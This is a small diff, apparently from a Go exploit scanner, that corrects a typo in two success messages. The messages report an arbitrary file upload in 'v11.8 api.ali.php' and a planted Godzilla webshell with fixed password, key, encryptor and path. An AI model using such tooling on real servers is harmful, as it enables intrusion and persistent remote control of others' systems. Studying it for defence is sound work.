@@ -104,7 +104,7 @@ Content-Type: application/octet-stream
 			}
 			//resContent4 := resp4.String()
 			if resp4.StatusCode == 200 {
-				return "[Td08] 存在v11.8 api.ali.php 任意文件上传\n已上传哥斯拉WebShell\n密码pass\n密钥key\n加密器PHP_XOR_BASE64\nWebshel地址：", nil
+				return "[Td08] 存在v11.8 api.ali.php 任意文件上传\n已上传哥斯拉WebShell\n密码pass\n密钥key\n加密器PHP_XOR_BASE64\nWebshell地址：", nil
 			} else {
 				return "", err
 			}
@@ -126,7 +126,7 @@ Content-Type: application/octet-stream
 					return "", err
 				}
 				if resp6.StatusCode == 200 {
-					return "[Td08] 存在v11.8 api.ali.php 任意文件上传\n已上传哥斯拉WebShell\n密码pass\n密钥key\n加密器PHP_XOR_BASE64\nWebshel地址： /fb6790f7.php", nil
+					return "[Td08] 存在v11.8 api.ali.php 任意文件上传\n已上传哥斯拉WebShell\n密码pass\n密钥key\n加密器PHP_XOR_BASE64\nWebshell地址： /fb6790f7.php", nil
 				} else {
 					return "", nil
 				}
